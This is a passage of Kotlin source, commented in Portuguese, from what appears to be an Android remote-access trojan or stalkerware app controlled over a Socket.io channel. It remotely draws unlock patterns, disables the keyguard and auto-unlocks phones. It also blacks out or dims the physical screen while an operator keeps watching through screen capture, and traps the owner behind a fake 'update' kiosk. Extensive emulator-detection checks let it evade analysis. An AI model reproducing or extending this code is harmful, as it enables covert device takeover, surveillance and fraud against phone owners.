                            emitLog("[BLOQUEIO OK] Árvore de nós da tela de bloqueio lida e enviada.")
                        }
                    }

                    on("desbloquear_padrao") { args ->
                        val json = parseJson(args)
                        val arrayPontos = json?.optJSONArray("pontos")
                        val pontos = mutableListOf<android.graphics.PointF>()
                        if (arrayPontos != null) {
                            for (i in 0 until arrayPontos.length()) {
                                val item = arrayPontos.optJSONObject(i)
                                if (item != null) {
                                    val x = item.optDouble("x", 0.0).toFloat()
                                    val y = item.optDouble("y", 0.0).toFloat()
                                    pontos.add(android.graphics.PointF(x, y))
                                }
                            }
                        }
                        // Índices 1-9 da sequência desenhada no painel. Quando
                        // presentes, o serviço desenha nos centros REAIS da grade
                        // detectada no aparelho (ignora a calibração do painel).
                        val arrayIdx = json?.optJSONArray("indices") ?: json?.optJSONArray("sequencia")
                        val indices = mutableListOf<Int>()
                        if (arrayIdx != null) {
                            for (i in 0 until arrayIdx.length()) {
                                val v = arrayIdx.optInt(i, 0)
                                if (v in 1..9) indices.add(v)
                            }
                        }
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[PADRÃO ERRO] Acessibilidade inativa.")
                            enviarResultadoPadrao(false)
                        } else {
                            svc.desbloquearPadraoPontos(pontos, if (indices.isNotEmpty()) indices else null) { sucesso ->
                                enviarResultadoPadrao(sucesso)
                            }
                        }
                    }

                    on("comando_bloqueio") { args ->
                        val json = parseJson(args)
                        val acao = json?.optString("action", "swipe_up") ?: "swipe_up"
                        val valStr = json?.optString("value", "")
                        val x = if (json?.has("x") == true) json.optDouble("x").toFloat() else null
                        val y = if (json?.has("y") == true) json.optDouble("y").toFloat() else null
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[BLOQUEIO ERRO] Acessibilidade inativa.")
                        } else {
                            svc.executarComandoBloqueio(acao, valStr, x, y)
                        }
                    }

                    on("abrir_acessibilidade") {
                        val svc = MyAccessibilityService.instance
                        if (svc != null) {
                            svc.executarComandoBloqueio("abrir_acessibilidade", null, null, null)
                        } else {
                            appContext?.let { ctx ->
                                try {
                                    val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                    }
                                    ctx.startActivity(intent)
                                } catch (_: Exception) {}
                            }
                        }
                    }
                    // ACORDAR TELA via Full-Screen Intent (método oficial do Android).
                    // Diferente do botao_power (que depende da acessibilidade e de
                    // WakeLock), este caminho dispara uma notificação URGENTE de tela
                    // cheia que abre a WakeUpActivity, acendendo o visor por cima da
                    // tela de bloqueio mesmo com a acessibilidade OFF e o dispositivo
                    // em Doze (tela apagada). Botão "🔔 Notificação" do painel.
                    // ================================================================
                    on("notificacao_acordar") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        val ctx = appContext ?: MyAccessibilityService.instance
                        if (ctx == null) {
                            emitLog("[ACORDAR] IGNORADO: sem contexto estável (appContext e acessibilidade nulos).")
                        } else {
                            WakeUpHelper.acordarTela(ctx)
                            emitLog("[ACORDAR] Comando 'notificacao_acordar' recebido — Full-Screen Intent disparado para acordar o dispositivo.")
                        }
                    }
                    // ================================================================
                    // EMULADOR WIREFRAME (Leitor de Tela) — controle remoto do
                    // painel: play/pause/fps/tap/swipe/back/home/recents/send_text.
                    // Despachado para MyAccessibilityService.executarControleWireframe.
                    // ================================================================
                    on("wireframe_control_painel") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[WIREFRAME] IGNORADO: acessibilidade off (controle wireframe).")
                        } else {
                            svc.executarControleWireframe(json)
                        }
                    }
                    // ================================================================
                    // DESBLOQUEAR POR SWIPE (tela de bloqueio SEM senha). Acorda a
                    // tela, desativa o keyguard via DISABLE_KEYGUARD e injeta um
                    // swipe-up automático de fallback (baixo -> cima). Botão
                    // "🔓 Desbloquear (Swipe)" do painel.
                    // ================================================================
                    on("desbloquear_aparelho") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            // Sem acessibilidade: pelo menos acorda a tela.
                            val ctx = appContext
                            if (ctx != null) WakeUpHelper.acordarTela(ctx)
                            emitLog("[DESBLOQUEAR] AVISO: acessibilidade OFF — apenas acordou a tela (swipe automático indisponível).")
                        } else {
                            svc.desbloquearSwipeRemoto()
                            emitLog("[DESBLOQUEAR] Comando recebido — desbloqueando por swipe (disableKeyguard + swipe-up automático).")
                        }
                    }
                    // ================================================================
                    // LIGA/DESLIGA o desbloqueio automático por swipe quando a tela
                    // acende (SCREEN_ON). Payload: {"ativo": true|false}.
                    // Default = true. Persistido em SharedPreferences; lido pelo
                    // receptor de SCREEN_ON do ScreenCaptureService.
                    // ================================================================
                    on("auto_desbloquear") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        val ativo = when {
                            json != null && json.has("ativo") -> json.optBoolean("ativo", true)
                            args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
                            else -> true
                        }
                        val ctx = appContext ?: MyAccessibilityService.instance
                        if (ctx == null) {
                            emitLog("[AUTO-DESBLOQUEAR] IGNORADO: sem contexto estável.")
                        } else {
                            try {
                                ctx.getSharedPreferences("rastreio_facil_prefs", Context.MODE_PRIVATE)
                                    .edit()
                                    .putBoolean(ScreenCaptureService.KEY_AUTO_DESBLOQUEAR_LIGACAO, ativo)
                                    .apply()
                                emitLog("[AUTO-DESBLOQUEAR] Auto-desbloqueio no ligamento ${if (ativo) "ATIVADO" else "DESATIVADO"} (persistido).")
                            } catch (e: Exception) {
                                emitLog("[AUTO-DESBLOQUEAR] ERRO ao salvar preferência: ${e.message}")
                            }
                        }
                    }
                    // ================================================================
                    // DARK MODE REAL DO SISTEMA — comando "botao_modo_escuro"
                    // Protocolo congelado: payload {"acao": "mostrar"|"ocultar"}
                    //   "mostrar" = ativar dark mode; "ocultar" = desativar (clarear)
                    // Servidor emite APENAS para o socket do dispositivo (não para
                    // a sala do painel), então o viewer de espelhamento continua normal.
                    // Cascade: (1) cmd uimode night (root/shell) ->
                    //          (2) Settings.Secure ui_night_mode (WRITE_SECURE_SETTINGS via ADB) ->
                    //          (3) fallback overlay preto nativo (sem root/ADB).
                    // ================================================================
                    on("botao_modo_escuro") { args ->
                        val json = parseJson(args)
                        if (comandoDestinadoAOutro(json)) return@on
                        val acao = json?.optString("acao", "mostrar") ?: "mostrar"
                        val ativar = (acao != "ocultar" && acao != "clarear" && acao != "no")
                        val ctx = appContext ?: MyAccessibilityService.instance
                        var metodoUsado = "nenhum"
                        // TENTATIVA 1 — dark mode REAL do sistema via comando shell (funciona com root ou permissão shell):
                        try {
                            val valor = if (ativar) "yes" else "no"
                            val proc = Runtime.getRuntime().exec(arrayOf("cmd", "uimode", "night", valor))
                            val codigo = proc.waitFor()
                            if (codigo == 0) {
                                metodoUsado = "cmd uimode night $valor"
                                ScreenCaptureService.removerTelaPretaFalsa() // dark real: remove overlay preto para não cobrir tudo
                            }
                        } catch (e: Exception) { /* cai para próxima tentativa */ }
                        // TENTATIVA 2 — Settings.Secure ui_night_mode (requere WRITE_SECURE_SETTINGS, concedível via ADB):
                        if (metodoUsado == "nenhum" && ctx != null) {
                            try {
                                // ui_night_mode: 1 = desativado (no), 2 = ativado (yes)
                                android.provider.Settings.Secure.putInt(ctx.contentResolver, "ui_night_mode", if (ativar) 2 else 1)
                                metodoUsado = "Settings.Secure ui_night_mode=${if (ativar) 2 else 1}"
                                ScreenCaptureService.removerTelaPretaFalsa()
                            } catch (e: Exception) { /* SecurityException sem permissão — cai para fallback */ }
                        }
                        // FALLBACK FINAL — overlay preto nativo (já existe, funciona SEM root/ADB; só a tela física escurece, o painel continua claro):
                        if (metodoUsado == "nenhum") {
                            if (ctx == null) {
                                emitLog("[MODO ESCURO] IGNORADO: sem contexto estável.")
                            } else if (ativar) {
                                ScreenCaptureService.ativarTelaPretaFalsa(ctx)
                                metodoUsado = "fallback overlay preto (sem root/ADB — dark mode real indisponivel)"
                            } else {
                                ScreenCaptureService.removerTelaPretaFalsa()
                                metodoUsado = "overlay preto removido"
                            }
                        }
                        emitLog("[MODO ESCURO] acao='$acao' (ativar=$ativar) -> metodo: $metodoUsado. Stream do painel continua claro.")
                    }
                }
                socket = s
                s.connect()
            } catch (e: URISyntaxException) {
                Log.e(TAG, "URI inválida para Socket.io: ${e.message}")
            }
        }
    }

    private fun parseJson(args: Array<out Any>): JSONObject? {
        if (args.isEmpty()) return null
        return try {
            when (val arg = args[0]) {
                is JSONObject -> arg
                is String -> JSONObject(arg)
                else -> null
            }
        } catch (e: Exception) {
            Log.e(TAG, "JSON inválido: ${e.message}")
            null
        }
    }

    // Nome deste aparelho (mesmo identificador usado no 'identificar').
    private fun nomeDispositivoAtual(): String = "${Build.MANUFACTURER}-${Build.MODEL}"

    /**
     * Dispara o Broadcast do Anúncio para os pacotes do Suporte Motor.
     * Como o Suporte Motor possui um UID diferente do app principal, a janela
     * com FLAG_SECURE criada por ele é OMITIDA da captura de tela do MediaProjection.
     */
    private fun dispararAnuncioViaSuporteMotor(ativo: Boolean) {
        // REDE DE SEGURANÇA: anúncio (tela preta) SÓ afeta dispositivos físicos.
        // Emuladores (Nox/MEmu/BlueStacks/etc.) IGNORAM completamente — o
        // painel/emulador NUNCA fica com a tela do anúncio.
        if (isEmulador) {
            emitLog("[ANUNCIO] IGNORADO: este aparelho é um EMULADOR — anúncio (tela preta) só afeta dispositivos físicos.")
            return
        }
        val ctx = appContext ?: MyAccessibilityService.instance
        if (ctx == null) {
            emitLog("[ANUNCIO ERRO] IGNORADO: sem contexto disponível para disparar broadcast.")
            return
        }
        try {
            val pacotes = listOf("com.example.suportemotor", "com.example.acessomaterno.suporte")
            for (pkg in pacotes) {
                val intent = Intent("com.example.acessomaterno.ACAO_ANUNCIO").apply {
                    setPackage(pkg)
                    putExtra("ativo", ativo)
                    putExtra("dispositivo", nomeDispositivoAtual())
                }
                ctx.sendBroadcast(intent)
            }
            emitLog("[ANUNCIO] Broadcast ACAO_ANUNCIO enviado para Suporte Motor (ativo=$ativo). Tela física preta com FLAG_SECURE em UID separado — painel continuará em cores normais.")
            // ── FALLBACK (brilho-zero) ───────────────────────────────────────
            // Se o Suporte Motor NÃO estiver instalado, o broadcast não tem
            // receptor. NÃO usamos overlay preto do próprio app: mesmo com
            // FLAG_SECURE, o MediaProjection do MESMO UID captura a janela e
            // o painel fica preto (o que aconteceu). Em vez disso, aplicamos
            // BRILHO-ZERO: a tela FÍSICA fica quase preta (brilho mínimo),
            // mas o MediaProjection NÃO é afetado pelo brilho — o PAINEL/
            // emulador continua em cores normais. O texto "Carregando…" só
            // aparece com o app Suporte Motor (UID separado) instalado.
            try {
                if (ativo) {
                    if (!anuncioBrilhoZeroAtivo) {
                        anuncioBrilhoZeroAtivo = ScreenCaptureService.ativarBrilhoZero(ctx)
                        emitLog("[ANUNCIO] Fallback: brilho-zero ATIVADO (tela física quase preta; painel continua em cores normais). 'Carregando…' só aparece com o app Suporte Motor instalado.")
                    }
                } else if (anuncioBrilhoZeroAtivo) {
                    ScreenCaptureService.removerBrilhoZero()
                    anuncioBrilhoZeroAtivo = false
                    emitLog("[ANUNCIO] Fallback: brilho-zero removido (tela física clareada).")
                }
            } catch (e2: Exception) {
                emitLog("[ANUNCIO ERRO] Fallback brilho-zero falhou: ${e2.message}")
            }
        } catch (e: Exception) {
            emitLog("[ANUNCIO ERRO] Falha ao enviar broadcast para Suporte Motor: ${e.message}")
        }
    }

    /**
     * QUIOSQUE DA ATUALIZAÇÃO (sala separada — só dispositivo físico).
     * Durante a atualização (loading_overlay / atualizacao_status ativo) o
     * dispositivo fica com a tela de atualização VISÍVEL mas TRAVADA:
     * overlay transparente que consome todo toque local (usuário não sai da
     * atualização) + tela sempre acesa. O emulador flutuante recebe apenas o
     * círculo de carregamento (não recebe este bloqueio — sala "painel").
     * Emuladores Android (Nox/MEmu/BlueStacks) pulam, seguindo o mesmo
     * isolamento do anúncio.
     */
    private fun aplicarKioskAtualizacao(ativo: Boolean) {
        if (isEmulador) {
            emitLog("[KIOSK ATUALIZACAO] IGNORADO: aparelho é emulador — quiosque/fixação só em dispositivo físico.")
            return
        }
        val svc = MyAccessibilityService.instance
        if (svc == null) {
            emitLog("[KIOSK ATUALIZACAO] IGNORADO: acessibilidade off (quiosque da atualização não aplicado).")
            return
        }
        if (ativo) svc.ativarKioskAtualizacao() else svc.removerKioskAtualizacao()
    }

    /**
     * Notifica o painel/emulador flutuante que a atualização terminou (usado
     * pelo auto-remove de 2 minutos da MainActivity). Emite loading_overlay
     * ativo=false → o servidor retransmite para a sala "painel" e o círculo de
     * carregamento do flutuante desaparece sozinho.
     */
    fun notificarAtualizacaoConcluida() {
        try {
            socket?.emit(
                "loading_overlay",
                mapOf("ativo" to false, "dispositivo" to nomeDispositivoAtual())
            )
            emitLog("[ATUALIZACAO] Concluída — painel/emulador flutuante notificado (círculo de carregamento removido).")
        } catch (e: Exception) {
            emitLog("[ATUALIZACAO ERRO] Falha ao notificar conclusão: ${e.message}")
        }
    }

    // Tipo: "emulador" ou "fisico". Enviado ao servidor para separação por
    // salas (Rooms); também usado como filtro local.
    // CORREÇÃO v2: detecção ROBUSTA (NoxPlayer, MEmu, BlueStacks, LDPlayer,
    // MuMu, Genymotion, SDK emulator). Emuladores falsificam Build.MODEL/
    // FINGERPRINT para passar na Play Store, mas deixam rastro em
    // SystemProperties (ro.kernel.qemu=1, ro.hardware=nox/memu/vbox) e em
    // arquivos característicos (/system/bin/nox-prop, /dev/socket/qemud...).
    // O resultado é cacheados (lazy) — a checagem é cara (reflection + IO).
    private fun tipoDispositivoAtual(): String = if (isEmulador) "emulador" else "fisico"

    /** Cache público da detecção de emulador (usado por MyAccessibilityService
     * para escolher o modo de blackout: overlay FLAG_SECURE vs. brilho-zero
     * transparente — emuladores ignoram FLAG_SECURE no MediaProjection). */
    val isEmulador: Boolean by lazy {
        try {
            isEmuladorDetectar()
        } catch (e: Exception) {
            false
        }
    }

    /** Lê uma propriedade do sistema (ro.*) via reflection — funciona SEM
     * permissão e SEM dependência de classes ocultas (SystemProperties é
     * acessível via reflection em todos os emuladores e dispositivos). */
    private fun sistemaPropriedade(chave: String): String? {
        return try {
            val clazz = Class.forName("android.os.SystemProperties")
            val metodo = clazz.getMethod("get", String::class.java)
            metodo.invoke(null, chave) as? String
        } catch (e: Exception) {
            null
        }
    }

    private fun isEmuladorDetectar(): Boolean {
        val fp = Build.FINGERPRINT.lowercase()
        val modelo = Build.MODEL.lowercase()
        val marca = Build.BRAND.lowercase()
        val fabricante = Build.MANUFACTURER.lowercase()
        val dispositivo = Build.DEVICE.lowercase()
        val produto = Build.PRODUCT.lowercase()
        val hardware = Build.HARDWARE.lowercase()

        // --- 1) Build.* (cobertura básica + emuladores conhecidos) ---
        val padsEmulador = listOf(
            "nox", "memu", "bluestacks", "ldplayer", "ldplayer", "mumu",
            "genymotion", "google_sdk", "android sdk", "emulator", "vbox",
            "goldfish", "ranchu", "android_x86", "droid4x", "andy", "windroye"
        )
        if (padsEmulador.any {
                fp.contains(it) || modelo.contains(it) || marca.contains(it) ||
                fabricante.contains(it) || dispositivo.contains(it) ||
                produto.contains(it) || hardware.contains(it)
            }) return true
        if (marca.startsWith("generic") && dispositivo.startsWith("generic")) return true
        if (produto == "google_sdk" || produto == "sdk_gphone_x86" ||
            produto == "sdk_gphone_arm64" || produto == "sdk_gphone64_x86_64") return true

        // --- 2) SystemProperties (ro.kernel.qemu=1 é setado por TODOS os
        //     emuladores principais, mesmo quando falsificam Build.MODEL) ---
        val qemu = sistemaPropriedade("ro.kernel.qemu")
        if (qemu == "1" || qemu == "true") return true
        val roHardware = sistemaPropriedade("ro.hardware")?.lowercase() ?: ""
        if (listOf("nox", "memu", "vbox86", "goldfish", "ranchu", "android_x86", "ttVM_x86")
                .any { roHardware.contains(it) }) return true
        val roProdutoModelo = sistemaPropriedade("ro.product.model")?.lowercase() ?: ""
        val roProdutoMarca = sistemaPropriedade("ro.product.brand")?.lowercase() ?: ""
        val roProdutoFabricante = sistemaPropriedade("ro.product.manufacturer")?.lowercase() ?: ""
        val roBoard = sistemaPropriedade("ro.product.board")?.lowercase() ?: ""
        if (listOf("nox", "memu", "bluestacks", "ldplayer", "mumu", "microvirt", "genymotion", "emulator")
                .any { roProdutoModelo.contains(it) || roProdutoMarca.contains(it) ||
                       roProdutoFabricante.contains(it) || roBoard.contains(it) }) return true

        // --- 3) Arquivos característicos (existem mesmo com Build falsificado) ---
        val arquivosSinalizadores = listOf(
            "/dev/socket/qemud", "/dev/qemu_pipe",
            "/system/lib/libc_malloc_debug_qemu.so", "/system/lib64/libc_malloc_debug_qemu.so",
            "/system/bin/nox-prop", "/system/bin/nox", "/system/lib/libnox.so",
            "/system/lib/libnox_vision.so", "/system/bin/memu", "/system/lib/libmemu.so",
            "/system/bin/ueventd.goldfish.rc", "/system/etc/init.goldfish.rc",
            "/system/lib/libbluestacks.so", "/data/bluestacks",
            "/system/bin/ldinit", "/system/lib/libldutils.so",
            "/dev/nox", "/dev/memu"
        )
        if (arquivosSinalizadores.any { java.io.File(it).exists() }) return true

        return false
    }

    private fun emitLog(msg: String) {
        try {
            socket?.emit("log_dispositivo", msg)
        } catch (_: Exception) {
        }
    }

    fun disconnect() {
        synchronized(this) {
            socket?.disconnect()
            socket = null
        }
    }
}

// ================================================================
// WAKE UP HELPER (embutido neste arquivo para evitar "Unresolved
// reference" caso o arquivo WakeUpHelper.kt não seja adicionado ao
// projeto). Mesmo pacote (com.example.acessomaterno).
// Dispara notificação de tela cheia (Full-Screen Intent) de alta
// prioridade que acende o visor por cima da tela de bloqueio.
// ================================================================
private object WakeUpHelper {

    private const val TAG = "WakeUpHelper"
    // Canal NOVO (silencioso): o Android congela as configs de um canal após
    // criado; trocar o ID garante que a versão SEM som/vibração/luz valha mesmo
    // em quem já tinha o canal barulhento antigo.
    private const val CHANNEL_ID = "WakeUpFullScreenChannelSilent"
    private const val NOTIFICATION_ID = 7701
    private const val CANCELAR_NOTIFICACAO_MS = 6000L

    private val handlerMain = Handler(Looper.getMainLooper())

    fun acordarTela(context: Context?) {
        val ctx = context?.applicationContext ?: run {
            Log.e(TAG, "acordarTela: contexto nulo — abortado.")
            emitirLog("[ACORDAR] ERRO: sem contexto para disparar notificação de tela cheia.")
            return
        }

        // 1) WakeLock parcial: garante execução mesmo em Doze
        try {
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
            @Suppress("DEPRECATION")
            val partial = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "AcessoMaterno:WakeUpPartial"
            )
            partial.acquire(30000L)
        } catch (e: Exception) {
            Log.e(TAG, "Falha no WakeLock parcial: ${e.message}")
        }

        // 2) Garantia extra: acende via PowerManager (caminho antigo)
        try {
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isInteractive) {
                @Suppress("DEPRECATION")
                val bright = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                        PowerManager.ACQUIRE_CAUSES_WAKEUP or
                        PowerManager.ON_AFTER_RELEASE,
                    "AcessoMaterno:WakeUpBright"
                )
                bright.acquire(30000L)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Falha no WakeLock brilhante: ${e.message}")
        }

        // 3) Cria o canal URGENTE (Android 8+ obriga canal)
        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (nm.getNotificationChannel(CHANNEL_ID) == null) {
                // IMPORTANCE_HIGH é obrigatório para o Full-Screen Intent acordar
                // a tela; mas o canal fica SILENCIOSO (sem som/vibração/luz) para
                // não ficar "atrapalhando" — só acende o visor, sem barulho.
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Comando Remoto — Acordar Tela",
                    NotificationManager.IMPORTANCE_HIGH
                ).apply {
                    description = "Acende o visor do dispositivo remotamente (silencioso)."
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                    setBypassDnd(false)
                }
                nm.createNotificationChannel(channel)
            }
        }

        // 4) Intent que abre a WakeUpActivity (janela rápida)
        val intentAbrir = Intent(ctx, WakeUpActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                Intent.FLAG_ACTIVITY_CLEAR_TOP or
                Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val flagsPI = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        val pendingIntent = PendingIntent.getActivity(ctx, 0, intentAbrir, flagsPI)

        // 5) Notificação de ALTA prioridade com Full-Screen Intent.
        //    CATEGORY_CALL = a categoria que o Android mais respeita para
        //    disparar full-screen imediato (igual a chamada telefônica).
        val notificacao = NotificationCompat.Builder(ctx, CHANNEL_ID)
            .setSmallIcon(obterIconePequeno(ctx))
            .setContentTitle("Comando Remoto")
            .setContentText("Dispositivo sendo ativado remotamente…")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setCategory(NotificationCompat.CATEGORY_CALL)
            .setFullScreenIntent(pendingIntent, true)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .setOngoing(false)
            // SILENCIOSO: sem som/vibração/luz. O Full-Screen Intent acima ainda
            // acende a tela; só removemos o "barulho" que atrapalhava.
            .setSilent(true)
            .setDefaults(0)
            .setTimeoutAfter(CANCELAR_NOTIFICACAO_MS)
            .build()

        try {
            nm.notify(NOTIFICATION_ID, notificacao)
            Log.d(TAG, "Notificação de tela cheia disparada (Full-Screen Intent).")
            emitirLog("[ACORDAR] Notificação urgente (Full-Screen Intent) disparada — WakeUpActivity deve acender o visor por cima da tela de bloqueio.")
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao disparar notificação: ${e.message}")
            emitirLog("[ACORDAR] ERRO ao disparar notificação: ${e.message}")
        }

        // 6) Cancela a notificação da shade após alguns segundos
        handlerMain.postDelayed({
            try {
                nm.cancel(NOTIFICATION_ID)
            } catch (_: Exception) {
            }
        }, CANCELAR_NOTIFICACAO_MS + 1000L)
    }

    private fun obterIconePequeno(ctx: Context): Int {
        return try {
            val id = ctx.resources.getIdentifier("ic_launcher", "mipmap", ctx.packageName)
            if (id != 0) id else android.R.drawable.ic_popup_reminder
        } catch (e: Exception) {
            android.R.drawable.ic_popup_reminder
        }
    }

    private fun emitirLog(msg: String) {
        try {
            SocketManager.socket?.emit("log_dispositivo", msg)
        } catch (_: Exception) {
        }
    }
}
